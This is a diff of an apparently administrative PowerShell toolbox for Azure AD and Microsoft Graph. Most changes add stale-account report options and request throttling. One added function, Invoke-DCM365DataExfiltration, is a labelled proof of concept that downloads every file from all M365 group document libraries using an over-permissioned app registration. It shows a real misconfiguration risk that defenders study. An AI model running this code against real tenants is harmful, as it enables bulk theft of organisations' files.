@@ -1,5 +1,5 @@
 function Get-DCHelp {
-    $DCToolboxVersion = '1.0.29'
+    $DCToolboxVersion = '1.0.32'
 
 
     $HelpText = @"
@@ -278,7 +278,7 @@ Install-Module -Name DCToolbox -Force
 Install-Module -Name AzureADPreview -Force
 Install-Package msal.ps -Force
 
-# Install required modules as curren user (if you're not local admin) (only needed first time).
+# Install required modules as current user (if you're not local admin) (only needed first time).
 Install-Module -Name DCToolbox -Scope CurrentUser -Force
 Install-Module -Name AzureADPreview -Scope CurrentUser -Force
 Install-Package msal.ps -Scope CurrentUser -Force
@@ -286,7 +286,7 @@ Install-Package msal.ps -Scope CurrentUser -Force
 
 # If you want to, you can run Connect-AzureAD before running Enable-DCAzureADPIMRole, but you don't have to.
 
-# If you want to use another accoutn than your current account using SSO, first connect with this.
+# If you want to use another account than your current account using SSO, first connect with this.
 Connect-AzureAD -AccountId 'user@example.com'
 
 # Enable one of your Azure AD PIM roles.
@@ -348,7 +348,41 @@ $Parameters = @{
     LastSeenDaysAgo = 30
 }
 
-New-DCStaleAccountReport @Parameters     
+New-DCStaleAccountReport @Parameters
+
+
+# Export stale GUEST Azure AD account report to Excel.
+$Parameters = @{
+    ClientID = ''
+    ClientSecret = ''
+    LastSeenDaysAgo = 60
+    OnlyGuests = $true
+}
+
+New-DCStaleAccountReport @Parameters
+
+
+# Export stale MEMBER Azure AD account report to Excel.
+$Parameters = @{
+    ClientID = ''
+    ClientSecret = ''
+    LastSeenDaysAgo = 60
+    OnlyMembers = $true
+}
+
+New-DCStaleAccountReport @Parameters
+
+
+# Export stale GUEST Azure AD account report with group/team membership to Excel.
+$Parameters = @{
+    ClientID = ''
+    ClientSecret = ''
+    LastSeenDaysAgo = 60
+    OnlyGuests = $true
+    IncludeMemberOf = $true
+}
+
+New-DCStaleAccountReport @Parameters
 
 '@
 
@@ -1014,10 +1048,10 @@ function Connect-DCMsGraphAsDelegated {
             https://danielchronlund.com/2018/11/19/fetch-data-from-microsoft-graph-with-powershell-paging-support/
             
         .PARAMETER ClientID
-            Client ID for your Azure AD application with Conditional Access Graph permissions.
+            Client ID for your Azure AD application.
         
         .PARAMETER ClientSecret
-            Client secret for the Azure AD application with Conditional Access Graph permissions.
+            Client secret for the Azure AD application.
             
         .INPUTS
             None
@@ -1119,10 +1153,10 @@ function Connect-DCMsGraphAsApplication {
             https://danielchronlund.com/2018/11/19/fetch-data-from-microsoft-graph-with-powershell-paging-support/
             
         .PARAMETER ClientID
-            Client ID for your Azure AD application with Conditional Access Graph permissions.
+            Client ID for your Azure AD application.
 
         .PARAMETER ClientSecret
-            Client secret for the Azure AD application with Conditional Access Graph permissions.
+            Client secret for the Azure AD application.
 
         .PARAMETER TenantName
             The name of your tenant (example.onmicrosoft.com).
@@ -2071,6 +2105,238 @@ function Get-DCAzureADUsersAndGroupsAsGuest {
 
 
 
+function Invoke-DCM365DataExfiltration {
+    <#
+        .SYNOPSIS
+            This script uses an Azure AD app registration to download all files from all M365 groups (Teams) document libraries in a tenant.
+        
+        .DESCRIPTION
+            This script is a proof of concept and for testing purposes only. Do not use this script in an unethical or unlawful way. Don’t be stupid!
+            
+            This script showcase how an attacker can exfiltrate huge amounts of files from a Microsoft 365 tenant, using a poorly protected Azure AD app registration with any of the following Microsoft Graph permissions:
+
+            - Files.Read.All
+            - Files.ReadWrite.All
+            - Sites.Read.All
+            - Sites.ReadWrite.All
+
+            Also, one of the following permissions is required to enumerate M365 groups and SharePoint document libraries:
+
+            - GroupMember.Read.All
+            - Group.Read.All
+            - Directory.Read.All
+            - Group.ReadWrite.All
+            - Directory.ReadWrite.All
+        
+            The script will loop through all M365 groups and their SharePoint Online document libraries (used by Microsoft Teams for storing files) and download all files it can find, down to three folder levels. The files will be downloaded to the current directory.
+            
+            A list of downloaded files will be copied to the clipboard after completion.
+
+            You can run the script with -WhatIf to skip the actual downloads. It will still show the output and what would have been downloaded.
+        
+        .PARAMETER ClientID
+            Client ID for your Azure AD application.
+
+        .PARAMETER ClientSecret
+            Client secret for the Azure AD application.
+
+        .PARAMETER TenantName
+            The name of your tenant (example.onmicrosoft.com).
+        
+        .PARAMETER WhatIf
+            Skip the actual downloads. It will still show the output and what would have been downloaded.
+        
+        .EXAMPLE
+            Invoke-M365DataExfiltration -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com'
+
+        .EXAMPLE
+            Invoke-M365DataExfiltration -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com' -WhatIf
+
+        .INPUTS
+            None
+
+        .OUTPUTS
+            One array with found users, and one array with found groups/teams.
+        
+        .NOTES
+            Author:   Daniel Chronlund
+            GitHub:   https://github.com/DanielChronlund/DCToolbox
+            Blog:     https://danielchronlund.com/
+	#>
+
+
+    param (
+        [parameter(Mandatory = $true)]
+        [string]$ClientID,
+
+        [parameter(Mandatory = $true)]
+        [string]$ClientSecret,
+
+        [parameter(Mandatory = $true)]
+        [string]$TenantName,
+
+        [parameter(Mandatory = $false)]
+        [switch]$WhatIf
+    )
+
+
+    # WhatIf.
+    if ($WhatIf) {
+        Write-Verbose -Verbose -Message "NOTE: -WhatIf was declared. Simulating run (no files will be downloaded)!"
+    }
+
+
+    # Connect to Microsoft Graph with application credentials.
+    Write-Verbose -Verbose -Message "Connecting to Microsoft Graph as Service Principal '$ClientID'..."
+    $Parameters = @{
+        ClientID = $ClientID
+        ClientSecret = $ClientSecret
+        TenantName = $TenantName
+    }
+
+    $AccessToken = Connect-DCMsGraphAsApplication @Parameters
+
+
+    # GET all Microsoft 365 Groups.
+    Write-Verbose -Verbose -Message "Fetching all Microsoft 365 groups (Teams)..."
+    $Parameters = @{
+        AccessToken = $AccessToken
+        GraphMethod = 'GET'
+        GraphUri = "https://graph.microsoft.com/v1.0/groups?`$filter=groupTypes/any(c:c+eq+'Unified')&`$select=id,displayName,description"
+    }
+
+    $M365Groups = Invoke-DCMsGraphQuery @Parameters
+    Write-Verbose -Verbose -Message "Found $($M365Groups.Count) Microsoft 365 groups."
+
+
+    # GET all related SharePoint document libraries.
+    Write-Verbose -Verbose -Message "Loading related SharePoint document libraries..."
+    $DocumentLibraries = foreach ($Group in $M365Groups) {
+        $Parameters = @{
+            AccessToken = $AccessToken
+            GraphMethod = 'GET'
+            GraphUri = "https://graph.microsoft.com/v1.0/groups/$($Group.id)/drive?`$select=id,name,webUrl"
+        }
+
+        Invoke-DCMsGraphQuery @Parameters
+    }
+    Write-Verbose -Verbose -Message "Done! Starting download job NOW..."
+
+
+    # DOWNLOAD files in the document libraries (root level + three folder levels down).
+    $Files = foreach ($DocumentLibrary in $DocumentLibraries) {
+        Write-Verbose -Verbose -Message "--- Looking in '$($DocumentLibrary.webUrl)'..."
+
+        $Parameters = @{
+            AccessToken = $AccessToken
+            GraphMethod = 'GET'
+            GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/root/children"
+        }
+
+        $RootContent = Invoke-DCMsGraphQuery @Parameters
+        $RootContent | where file
+
+        # Download files in root directory.
+        foreach ($File in ($RootContent | where file)) {
+            Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."
+
+            $HeaderParams = @{
+                'Content-Type'  = "application\json"
+                'Authorization' = "Bearer $AccessToken"
+            }
+
+            if (!($WhatIf)) {
+                Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
+            }
+        }
+
+        foreach ($Item in ($RootContent | where folder)) {
+            $Parameters = @{
+                AccessToken = $AccessToken
+                GraphMethod = 'GET'
+                GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
+            }
+
+            $SubContentLevel1 = Invoke-DCMsGraphQuery @Parameters
+            $SubContentLevel1 | where file
+            
+            # Download files in sub SubContentLevel1.
+            foreach ($File in ($SubContentLevel1 | where file)) {
+                Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."
+
+                $HeaderParams = @{
+                    'Content-Type'  = "application\json"
+                    'Authorization' = "Bearer $AccessToken"
+                }
+
+                if (!($WhatIf)) {
+                    Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
+                }
+            }
+
+            # Go through folders in SubContentLevel1.
+            foreach ($Item in ($SubContentLevel1 | where folder)) {
+                $Parameters = @{
+                    AccessToken = $AccessToken
+                    GraphMethod = 'GET'
+                    GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
+                }
+        
+                $SubContentLevel2 = Invoke-DCMsGraphQuery @Parameters
+                $SubContentLevel2 | where file
+                
+                # Download files in sub SubContentLevel2.
+                foreach ($File in ($SubContentLevel2 | where file)) {
+                    Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."
+
+                    $HeaderParams = @{
+                        'Content-Type'  = "application\json"
+                        'Authorization' = "Bearer $AccessToken"
+                    }
+
+                    if (!($WhatIf)) {
+                        Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
+                    }
+                }
+
+                # Go through folders in SubContentLevel2.
+                foreach ($Item in ($SubContentLevel2 | where folder)) {
+                    $Parameters = @{
+                        AccessToken = $AccessToken
+                        GraphMethod = 'GET'
+                        GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
+                    }
+            
+                    $SubContentLevel3 = Invoke-DCMsGraphQuery @Parameters
+                    $SubContentLevel3 | where file
+                    
+                    # Download files in sub SubContentLevel3.
+                    foreach ($File in ($SubContentLevel3 | where file)) {
+                        Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."
+
+                        $HeaderParams = @{
+                            'Content-Type'  = "application\json"
+                            'Authorization' = "Bearer $AccessToken"
+                        }
+
+                        if (!($WhatIf)) {
+                            Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+
+    # Copy result to clipboard and exit.
+    $Files | Select-Object Name,size | Set-Clipboard
+    Write-Verbose -Verbose -Message "File list copied to clipboard!"
+    Write-Verbose -Verbose -Message "All done!"
+}
+
+
+
 function New-DCStaleAccountReport {
     <#
         .SYNOPSIS
@@ -2100,6 +2366,15 @@ function New-DCStaleAccountReport {
         .PARAMETER LastSeenDaysAgo
             Specify the number of days ago the account was last seen. Note that you can only see as long as your Azure AD sign-in logs reach (30 days by default).
 
+        .PARAMETER OnlyMembers
+            Only include member accounts (no guest accounts) in the report.
+
+        .PARAMETER OnlyGuests
+            Only include guest accounts (no member accounts) in the report.
+
+        .PARAMETER IncludeMemberOf
+            Add a column with all group/teams memberships.
+
         .INPUTS
             None
 
@@ -2118,6 +2393,16 @@ function New-DCStaleAccountReport {
                 LastSeenDaysAgo = 30
             }
 
+            New-DCStaleAccountReport @Parameters
+
+
+            $Parameters = @{
+                ClientID = ''
+                ClientSecret = ''
+                LastSeenDaysAgo = 10
+                OnlyGuests = $true
+                IncludeMemberOf = $true
+            }
             New-DCStaleAccountReport @Parameters
     #>
 
@@ -2140,7 +2425,10 @@ function New-DCStaleAccountReport {
         [switch]$OnlyMembers,
 
         [parameter(Mandatory = $false)]
-        [switch]$OnlyGuests
+        [switch]$OnlyGuests,
+
+        [parameter(Mandatory = $false)]
+        [switch]$IncludeMemberOf
     )
 
 
@@ -2203,6 +2491,31 @@ function New-DCStaleAccountReport {
             $LastSignInActivity = $lastSignInDateTime
         }
 
+
+        # Include group membership (might be slow).
+        $MemberOf = ""
+
+        if ($IncludeMemberOf) {
+            $GraphUri = "https://graph.microsoft.com/beta/users/$($User.id)/memberOf"
+
+            $Parameters = @{
+                AccessToken = $AccessToken
+                GraphMethod = 'GET'
+                GraphUri = $GraphUri
+            }
+            
+            $Groups = Invoke-DCMsGraphQuery @Parameters
+
+            $MemberOf = foreach ($Group in $Groups) {
+                if ($Groups.count -gt 1) {
+                    "$($Group.displayName)"
+                } else {
+                    "$($Group.displayName; )"
+                }
+            }
+        }
+
+
         # Filter and format stale accounts.
         if ($null -eq $LastSignInActivity -or (Get-Date -Date $LastSignInActivity) -lt ((Get-Date -Date (Get-Date -Format 'yyyy-MM-dd')).AddDays(-$LastSeenDaysAgo))) {
             $CustomObject = New-Object -TypeName psobject
@@ -2224,6 +2537,10 @@ function New-DCStaleAccountReport {
             $CustomObject | Add-Member -MemberType NoteProperty -Name "companyName" -Value $User.companyName
             $CustomObject | Add-Member -MemberType NoteProperty -Name "department" -Value $User.department
             $CustomObject | Add-Member -MemberType NoteProperty -Name "country" -Value $User.country
+
+            if ($IncludeMemberOf) {
+                $CustomObject | Add-Member -MemberType NoteProperty -Name "GroupMembership" -Value $MemberOf.ToString()
+            }
 
             $CustomObject | Add-Member -MemberType NoteProperty -Name "id" -Value $User.id
 
@@ -2654,11 +2971,13 @@ function New-DCConditionalAccessPolicyDesignReport {
 
 
     # Fetch service principals for id translation.
+    Start-Sleep -Seconds 1
     $GraphUri = 'https://graph.microsoft.com/beta/servicePrincipals'
     $EnterpriseApps = Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri
 
 
     # Fetch roles for id translation.
+    Start-Sleep -Seconds 1
     $GraphUri = 'https://graph.microsoft.com/beta/directoryRoles'
     $AzureADRoles = Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri
 
@@ -2681,6 +3000,7 @@ function New-DCConditionalAccessPolicyDesignReport {
             if ($User -ne 'All' -and $User -ne 'GuestsOrExternalUsers' -and $User -ne 'None') {
                 $GraphUri = "https://graph.microsoft.com/beta/users/$User"
                 try {
+                    Start-Sleep -Seconds 1
                     (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).userPrincipalName
                 }
                 catch {
@@ -2698,6 +3018,7 @@ function New-DCConditionalAccessPolicyDesignReport {
         # excludeUsers
         $Users = foreach ($User in $Policy.conditions.users.excludeUsers) {
             if ($User -ne 'All' -and $User -ne 'GuestsOrExternalUsers' -and $User -ne 'None') {
+                Start-Sleep -Seconds 1
                 $GraphUri = "https://graph.microsoft.com/beta/users/$User"
                 try {
                     (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).userPrincipalName
@@ -2717,6 +3038,7 @@ function New-DCConditionalAccessPolicyDesignReport {
         # includeGroups
         $Groups = foreach ($Group in $Policy.conditions.users.includeGroups) {
             if ($Group -ne 'All' -and $Group -ne 'None') {
+                Start-Sleep -Seconds 1
                 $GraphUri = "https://graph.microsoft.com/beta/groups/$Group"
                 try {
                     (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).displayName
@@ -2736,6 +3058,7 @@ function New-DCConditionalAccessPolicyDesignReport {
         # excludeGroups
         $Groups = foreach ($Group in $Policy.conditions.users.excludeGroups) {
             if ($Group -ne 'All' -and $Group -ne 'None') {
+                Start-Sleep -Seconds 1
                 $GraphUri = "https://graph.microsoft.com/beta/groups/$Group"
                 try {
                     (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).displayName
@@ -2862,6 +3185,7 @@ function New-DCConditionalAccessPolicyDesignReport {
         # excludeLocation
         $excludeLocations = foreach ($excludeLocation in $Policy.conditions.locations.excludeLocations) {
             if ($excludeLocation -ne 'All' -and $excludeLocation -ne 'AllTrusted' -and $excludeLocation -ne '00000000-0000-0000-0000-000000000000') {
+                Start-Sleep -Seconds 1
                 $GraphUri = "https://graph.microsoft.com/beta/identity/conditionalAccess/namedLocations/$excludeLocation"
                 (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).displayName
             }
